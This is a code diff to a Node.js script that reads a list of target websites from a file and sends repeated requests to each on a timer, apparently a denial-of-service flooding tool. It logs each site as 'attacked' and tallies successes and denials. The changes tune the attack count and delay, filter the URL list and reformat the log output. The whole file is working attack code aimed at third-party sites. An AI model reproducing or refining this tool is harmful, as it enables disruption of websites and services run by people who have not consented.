@@ -1,6 +1,6 @@
 const SITES_FILE = 'urls.txt'; // file with sites list
-const ATTACK_COUNT = 20; // number of attacks per site
-const DELAY_BETWEEN_ATTACK = 120000; // ms 6000 = 1min
+const ATTACK_COUNT = 5; // number of attacks per site
+const DELAY_BETWEEN_ATTACK = 30000; // ms 60000 = 1min
 
 const request = require('request');
 const fs = require('fs');
@@ -19,13 +19,17 @@ function repeatFunction(url, func, times) {
 }
 
 async function updateUrls() {
+  urls.length = 0;
   const fileStream = fs.createReadStream(SITES_FILE);
   const rl = readline.createInterface({
     input: fileStream,
     crlfDelay: Infinity,
   });
 
-  for await (const line of rl) urls.push(line);
+  for await (const line of rl) {
+	if(!line.includes('!') )urls.push(line);
+	
+  }
 }
 
 function attackSite(url, testAttack = false) {
@@ -38,11 +42,13 @@ function bodyRequest(err, res, body) {
   try {
     if (err) throw err;
     console.log(
-      `Site ${url} has been attacked, attack status: ${attackStatus}, code: ${res.statusCode}`
-    );
+      //`Site ${url} has been attacked, attack status: ${attackStatus} code: ${res.statusCode}`
+	`${attackStatus} ${testAttack ? 'try ' : ''}attack ${url} code: ${res.statusCode}`    
+);
   } catch (e) {
     console.log(
-      `Site ${url} has been attacked, attack status: ${attackStatus}, error code: ${e.errno}`
+      `${attackStatus} ${testAttack ? 'try ' : ''}attack ${url} error code: ${e.errno}`
+      //`Site ${url} has been attacked, attack status: ${attackStatus}, error code: ${e.errno}`
     );
   }
   if (attackStatus === 'Success' && testAttack) {
@@ -56,8 +62,10 @@ async function startAttack() {
     `ATTACK STATISTICS: SUCCESS = ${statistics.success}, DENIED = ${statistics.denied}`
   );
   await updateUrls();
+	console.log(`length = ${urls.length}`)
+	console.log(urls)
   if (urls.length) for await (const url of urls) attackSite(url, true);
-  setInterval(startAttack, DELAY_BETWEEN_ATTACK);
+  setTimeout(startAttack, DELAY_BETWEEN_ATTACK);
 }
 
 startAttack(); // main function
